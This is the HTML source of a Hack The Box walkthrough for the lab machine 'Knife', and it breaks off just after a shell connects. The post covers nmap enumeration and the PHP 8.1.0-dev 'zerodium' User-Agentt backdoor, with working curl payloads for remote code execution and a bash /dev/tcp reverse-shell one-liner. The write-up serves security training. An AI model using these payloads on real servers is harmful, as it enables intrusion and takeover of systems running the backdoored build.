@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	22 May 2021IP:	10.10.10.242">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[knife]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/05/23/knife/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	22 May 2021IP:	10.10.10.242">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1985.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1986.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1987.jpg">
+<meta property="article:published_time" content="2021-05-23T04:03:18.000Z">
+<meta property="article:modified_time" content="2021-08-29T05:27:53.823Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1985.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/05/23/knife/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/05/23/knife/","path":"2021/05/23/knife/","title":"Hack-The-Box-walkthrough[knife]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[knife] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number"></span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PORT"><span class="nav-number"></span> <span class="nav-text">PORT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number"></span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Visting"><span class="nav-number"></span> <span class="nav-text">Web-Visting</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-number"></span> <span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC"><span class="nav-number"></span> <span class="nav-text">PrivESC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH-Access"><span class="nav-number"></span> <span class="nav-text">SSH Access</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-1"><span class="nav-number"></span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-l"><span class="nav-number">1.</span> <span class="nav-text">sudo -l</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">2.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">3.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/05/23/knife/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[knife] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[knife]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-23 12:03:18" itemprop="dateCreated datePublished" datetime="2021-05-23T12:03:18+08:00">2021-05-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-08-29 13:27:53" itemprop="dateModified" datetime="2021-08-29T13:27:53+08:00">2021-08-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Easy<br>Points:	20<br>Release:	22 May 2021<br>IP:	10.10.10.242</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1985.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="PORT"><a href="#PORT" class="headerlink" title="PORT"></a>PORT</h2><table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH</td>
+<td>Openssh 8.2p1</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.41</td>
+</tr>
+</tbody></table>
+<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.91 scan initiated Sun May 23 01:14:04 2021 as: nmap -A -v -T4 -oN intial.nmap 10.10.10.242</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.242</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)</span><br><span class="line">|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)</span><br><span class="line">|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Emergent Medical Idea</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=5/23%OT=22%CT=1%CU=36992%PV=Y%DS=2%DC=T%G=Y%TM=60A9AC7</span><br><span class="line">OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS</span><br><span class="line">OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1</span><br><span class="line">OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN</span><br><span class="line">OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A</span><br><span class="line">OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F</span><br><span class="line">OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%</span><br><span class="line">OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD</span><br><span class="line">OS:=S)</span><br><span class="line"></span><br><span class="line">Uptime guess: 37.562 days (since Thu Apr 15 11:45:44 2021)</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 587/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   118.25 ms 10.10.14.1</span><br><span class="line">2   117.19 ms 10.10.10.242</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun May 23 01:14:37 2021 -- 1 IP address (1 host up) scanned in 34.30 seconds</span></span><br></pre></td></tr></table></figure>
+<p>From nmap result one thing caught my and that is it an apache httpd server instead of regular nginx in all the HackTheBox Machine.</p>
+<p>As the latest release for apache httpd is 2.4.46 there could be a known vuln in 2.4.41 so I looked for it on web.</p>
+<p>Looking for it I stumbled around this Rapid7 Post <span class="exturl" data-url="aHR0cHM6Ly93d3cucmFwaWQ3LmNvbS9kYi92dWxuZXJhYmlsaXRpZXMvYXBhY2hlLWh0dHBkLWN2ZS0yMDIwLTE5MzQv">https://www.rapid7.com/db/vulnerabilities/apache-httpd-cve-2020-1934/<i class="fa fa-external-link-alt"></i></span>.</p>
+<p>But there is one concerning thing about this exploit you need to have mod_proxy_ftp</p>
+<p>module running and have FTP backend which we know nothing of.</p>
+<h2 id="Web-Visting"><a href="#Web-Visting" class="headerlink" title="Web-Visting"></a>Web-Visting</h2><ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife1.png"></li>
+</ul>
+<p>We can find this static page and nothing intresting in it. </p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife2.png"></li>
+</ul>
+<p>looking the source code found pen.js which looked intresting but after looking at it got nothing intresting.</p>
+<p>Also added knife.htb in &#x2F;etc&#x2F;hosts to look for sub-domain but interestingly we found the default nginx page.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife3.png"></li>
+</ul>
+<p>This was intresting.<br>But let’s go back to your main page.<br>Looking for vulns I found one intresting thing that php 8.1.x-dev was backdoored by some hackers.<br>You can find articles on it.</p>
+<ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly90ZWNoYmVhY29uLmNvbS9zZWN1cml0eS9waHAtYmFja2Rvb3JlZC1naXQtaGFjay1pdHMtbm8tam9rZS1zby1kb250LWJlLWZvb2w=">PHP backdoored via Git hack: It’s no joke, so don’t be a fool<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cud2VsaXZlc2VjdXJpdHkuY29tLzIwMjEvMDMvMzAvYmFja2Rvb3ItcGhwLXNvdXJjZS1jb2RlLWdpdC1zZXJ2ZXItYnJlYWNoLw==">Backdoor added to PHP source code in Git server breach<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<p>This is intresting as server is leaking the the version of PHP.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/knife4.png"></li>
+</ul>
+<p>Wappalyzer detected it.<br>Looking through bunch of article finally came up to this one where it showed how to exploit this backdoored by some troll hackers.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5MTU2NjcwNzY1MjYvYXJ0aWNsZS9kZXRhaWxzLzExNjQ0Nzg2NA==">PHP 8.1.0-dev 开发版本后门事件<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>The website is originally in chinese but the google translate works fine.<br>So let’s see if your PHP is dev version or not.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Knife$ curl -i http://10.10.10.242/</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 23 May 2021 02:31:24 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p>Looking at X-Powered-By header we can say that indeed we are in luck and the version is PHP&#x2F;8.1.0-dev.</p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Reading throught the article found out that the backdoor can be accessed using User-Agent Header to execute the code.<br>We have to append the string zerodium which is also one of the leading zero day vuln finder firm.<br>so let’s try PoC for this exploit.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/knife]</span><br><span class="line">└─<span class="comment"># curl -i -s -k -H &#x27;User-Agentt: zerodiumvar_dump(2*3);&#x27; http://10.10.10.242/</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 23 May 2021 04:34:01 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">int(6)</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span> &gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Looks like we triggered the RCE let’s get going and get try to excute system commands.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/knife]</span><br><span class="line">└─<span class="comment"># curl -i -s -k -H &#x27;User-Agentt: zerodiumsystem(&quot;id&quot;);&#x27; http://10.10.10.242                                                     </span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 23 May 2021 04:35:06 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">uid=1000(james) gid=1000(james) <span class="built_in">groups</span>=1000(james)</span><br></pre></td></tr></table></figure>
+
+<p>Looks like the web server is running as james so one less step for us.<br>Let’s get the REV-Shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Knife$ curl -i -s -k -H $<span class="string">&#x27;User-Agentt: zerodiumsystem(\&quot;bash -c \&#x27;</span>bash -i &gt;&amp; /dev/tcp/10.10.14.18/2333 0&gt;&amp;1\<span class="string">&#x27;\&quot;);&#x27;</span> http://10.10.10.242</span><br></pre></td></tr></table></figure>
+
+<p>And boom we have the shell and user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/knife]</span><br><span class="line">└─<span class="comment"># nc -lvp 2333                                                                                                                  </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2333</span><br><span class="line">Ncat: Listening on 0.0.0.0:2333</span><br><span class="line">Ncat: Connection from 10.10.10.242.</span><br><span class="line">Ncat: Connection from 10.10.10.242:34454.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1020): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job 